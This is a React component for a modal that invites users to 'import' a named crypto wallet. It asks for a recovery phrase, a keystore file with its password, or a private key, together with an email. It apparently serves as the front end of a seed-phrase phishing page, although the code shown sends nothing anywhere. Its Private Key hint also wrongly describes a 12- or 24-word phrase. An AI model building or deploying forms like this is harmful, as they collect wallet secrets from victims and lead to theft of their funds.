import React, { useState } from "react";

const ImportWallet = ({ wallet, onClose }) => {
  const [activeTab, setActiveTab] = useState("Phrase");

  if (!wallet) return null;

  const tabs = ["Phrase", "Keystore JSON", "Private Key"];

  const renderTabContent = () => {
    switch (activeTab) {
      case "Phrase":
        return (
          <div>
            <label className="block text-sm font-bold mb-2">Phrase</label>
            <textarea
              rows={4}
              placeholder="Enter your recovery phrase"
              className="w-full p-3 rounded-lg border border-gray-200 bg-[#d4f1ff] focus:outline-none focus:ring-2 focus:ring-blue-500/20 transition-all resize-none"
            />
            <p className="text-xs text-gray-400 mt-2">
              Typically 12 (sometimes 24) words separated by single spaces
            </p>
          </div>
        );
      case "Keystore JSON":
        return (
          <div className="space-y-4">
            <div>
              <label className="block text-sm font-bold mb-2">
                Keystore JSON
              </label>
              <textarea
                rows={3}
                placeholder="Keystore JSON"
                className="w-full p-3 rounded-lg border border-gray-200 bg-[#d4f1ff] focus:outline-none focus:ring-2 focus:ring-blue-500/20 transition-all resize-none font-mono text-xs"
              />
            </div>
            <div>
              <label className="block text-sm font-bold mb-2">Password</label>
              <input
                type="password"
                placeholder="Wallet password"
                className="w-full p-3 rounded-lg border border-gray-200 bg-[#d4f1ff] focus:outline-none focus:ring-2 focus:ring-blue-500/20 transition-all"
              />
              <p className="text-xs text-gray-400 mt-2">
                Several lines of text beginning with "{"{...}"}" plus the
                password you used to encrypt it.
              </p>
            </div>
          </div>
        );
      case "Private Key":
        return (
          <div>
            <label className="block text-sm font-bold mb-2">Private Key</label>
            <input
              type="text"
              placeholder="Enter your private key"
              className="w-full p-3 rounded-lg border border-gray-200 bg-[#d4f1ff] focus:outline-none focus:ring-2 focus:ring-blue-500/20 transition-all"
            />
            <p className="text-xs text-gray-400 mt-2">
              Typically 12 (sometimes 24) words separated by a single space.
            </p>
          </div>
        );
      default:
        return null;
    }
  };

  return (
    <div
      /* CHANGED: items-end to items-center */
      className="fixed inset-0 z-[60] flex items-center justify-center bg-black/60 backdrop-blur-sm p-4"
      onClick={onClose}
    >
      <div
        /* CHANGED: Removed rounded-t-[32px], added rounded-2xl and scale animation */
        className="bg-[#e9f8ff] text-[#0E1D26] w-full max-w-lg rounded-2xl shadow-2xl relative flex flex-col animate-modal-in overflow-hidden"
        onClick={(e) => e.stopPropagation()}
      >
        {/* Header */}
        <div className="p-6 border-b border-gray-100 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <div className="w-14 h-14 rounded-full bg-white border border-gray-100 flex items-center justify-center overflow-hidden">
              <img
                src={wallet.icon}
                alt=""
                className="object-contain"
              />
            </div>
            <h2 className="text-lg font-bold">
              Import your {wallet.name} Wallet
            </h2>
          </div>
          <button
            onClick={onClose}
            className="text-gray-400 hover:text-gray-600"
          >
            <svg
              xmlns="http://www.w3.org/2000/svg"
              className="h-6 w-6"
              fill="none"
              viewBox="0 0 24 24"
              stroke="currentColor"
            >
              <path
                strokeLinecap="round"
                strokeLinejoin="round"
                strokeWidth={2}
                d="M6 18L18 6M6 6l12 12"
              />
            </svg>
          </button>
        </div>

        {/* Tabs */}
        <div className="flex px-6 border-b border-gray-100">
          {tabs.map((tab) => (
            <button
              key={tab}
              onClick={() => setActiveTab(tab)}
              className={`py-4 px-4 text-base transition-all relative ${
                activeTab === tab ? "text-black" : "text-gray-400"
              }`}
            >
              {tab}
              {activeTab === tab && (
                <div className="absolute bottom-0 left-0 right-0 h-0.5 bg-black" />
              )}
            </button>
          ))}
        </div>

        {/* Form Body */}
        <div className="p-6 space-y-5 max-h-[80vh] overflow-y-auto">
          {/* Shared Inputs */}
          <div>
            <label className="block text-sm font-bold mb-2">Name wallet</label>
            <input
              type="text"
              placeholder="Name wallet"
              className="w-full p-3 rounded-lg border border-gray-200 bg-[#d4f1ff] focus:outline-none"
            />
          </div>

          <div>
            <label className="block text-sm font-bold mb-2">Email</label>
            <input
              type="email"
              placeholder="Email"
              className="w-full p-3 rounded-lg border border-gray-200 bg-[#d4f1ff] focus:outline-none"
            />
          </div>

          {/* Dynamic Content Layout */}
          <div className="pt-2">{renderTabContent()}</div>

          {/* Action Buttons */}
          <div className="flex gap-3 pt-4">
            <button
              onClick={onClose}
              className="flex-1 py-3 px-6 rounded-2xl bg-[#D63384] text-white font-bold hover:opacity-90 transition-opacity"
            >
              Cancel
            </button>
            <button className="flex-1 py-3 px-6 rounded-2xl bg-[#007B8F] text-white font-bold uppercase tracking-wide hover:opacity-90 transition-opacity">
              proceed
            </button>
          </div>
        </div>
      </div>

      <style>{`
        @keyframes modalIn {
          from { 
            opacity: 0;
            transform: scale(0.95) translateY(10px); 
          }
          to { 
            opacity: 1;
            transform: scale(1) translateY(0); 
          }
        }
        .animate-modal-in {
          animation: modalIn 0.2s ease-out forwards;
        }
      `}</style>
    </div>
  );
};

export default ImportWallet;